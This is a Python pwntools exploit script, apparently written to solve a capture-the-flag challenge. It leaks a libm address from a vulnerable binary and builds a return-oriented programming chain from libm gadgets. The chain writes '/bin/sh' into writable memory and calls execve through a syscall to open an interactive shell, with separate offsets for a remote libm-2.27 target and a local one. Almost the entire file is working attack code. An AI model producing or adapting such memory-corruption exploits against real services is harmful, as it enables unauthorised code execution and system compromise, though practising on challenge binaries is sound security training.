#! /usr/bin/python

from pwn import *

context.update(
        arch="amd64",
        #arch="i386",
        endian="little",
        log_level="debug",
        os="linux",
        #terminal=["tmux", "split-window", "-h", "-p 65"]
        terminal=["ghostty", "-e"]
)

def start(binary):

    gs = '''
        init-pwndbg
        set context-sections stack regs disasm
        set show-compact-regs on
        set resolve-heap-via-heuristic on
    '''

    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        return remote()
    else:
        return process(binary)

def exploit(p,e,l):
    pad = b"A" * 16
    p.recvuntil(b"0x")
    libm_leak = int(p.recvline().strip(b"\n"), 16)

    libm_base = libm_leak - l.sym["fabs"]
    l.address = libm_base
    log.info(f"Leaked libm base: {hex(libm_base)}")
 
    r = ROP(l)

    pop_rdi = p64(r.find_gadget(["pop rdi", "ret"])[0])
    pop_rsi = p64(r.find_gadget(["pop rsi", "ret"])[0])
    pop_rdx = p64(r.find_gadget(["pop rdx", "ret"])[0])
    pop_rcx = p64(r.find_gadget(["pop rcx", "ret"])[0])
    pop_rax = p64(r.find_gadget(["pop rax", "ret"])[0])
    syscall = p64(r.find_gadget(["syscall"])[0])


    chain = pop_rax + p64(0x3b)

    if args.REMOTE:
        # mov dword ptr [rdi], edx; ret
        writeable_mem = libm_base + 0x39d170

        log.info(f"writing /bin/sh to {hex(writeable_mem)}")

        write_gadget = p64(libm_base + 0x051106)
        
        chain += pop_rdi + p64(writeable_mem)
        chain += pop_rdx + b"/bin/\x00\x00\x00\x00"
        chain += write_gadget 

        chain += pop_rdi + p64(writeable_mem + 0x4)
        chain += pop_rdx + b"/sh\x00\x00\x00\x00\x00"
        chain += write_gadget 

    else:
        writeable_mem = libm_base + 0xef000
        #0x0000000000035560 : mov qword ptr [rsi], rdx ; pop rbp ; ret 
        write_gadget = p64(libm_base + 0x035560)

        log.info(f"writing /bin/sh to {hex(writeable_mem)}")

        chain += pop_rdx + b"/bin/sh\x00"
        chain += pop_rsi + p64(writeable_mem)
        chain += write_gadget + b"B" * 8


    chain += pop_rdi + p64(writeable_mem)
    chain += pop_rsi + p64(0)
    chain += pop_rdx + p64(0)
    chain += syscall

    p.sendline(pad + chain)
    p.interactive()

if __name__=="__main__":
    file = args.BIN

    p = start(file)
    e = context.binary = ELF(file)

    if args.REMOTE:
        l = ELF("./libm-2.27.so")
    else: 
        l = ELF("/usr/lib/libm.so.6")


    exploit(p,e,l)
